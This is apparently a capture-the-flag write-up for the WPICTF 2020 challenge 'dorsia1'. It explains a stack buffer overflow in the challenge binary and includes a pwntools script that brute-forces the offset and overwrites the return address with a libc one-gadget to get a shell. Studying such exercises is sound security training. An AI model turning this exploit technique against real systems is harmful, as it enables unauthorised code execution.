
## dorsia1
### Description

> http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The first card. 
>
> nc  dorsia1.wpictf.xyz 31337 or 31338 or 31339 
>
> made by: awg 
>
> Hint: Same libc as dorsia4, but you shouldn't need the file to solve.


### Attachment

[dorsia1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WPICTF2020/pwn/dorsia1/dorsia1) (not given, I download it after getshell)

### Analysis

We can get source code of this challenge from the first card:

![](http://image.taqini.space/img/cap_dorsia_00:00:06_01.jpg) 

`system+765772` is the address of one gadget in `libc2.27`, and there is a buffer overflow in stack. So we can overwrite the return address with address of one gadget.

### Solution

We can't get the precise offset between buffer `a` and return address, but we know the approximate range. So try it:

```python
for i in range(4,20):
    p = remote('dorsia1.wpictf.xyz',31338)
    og = eval(p.recv(14))
    print 'og',hex(og)
    p.recv()
    offset = 69+i
    payload = 'A'*offset
    payload += p64(og)
    print "[+] ",i
    print payload
    p.sendline(payload)
    p.interactive()
```

> final offset is 77

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/WPICTF2020/pwn/dorsia1) 


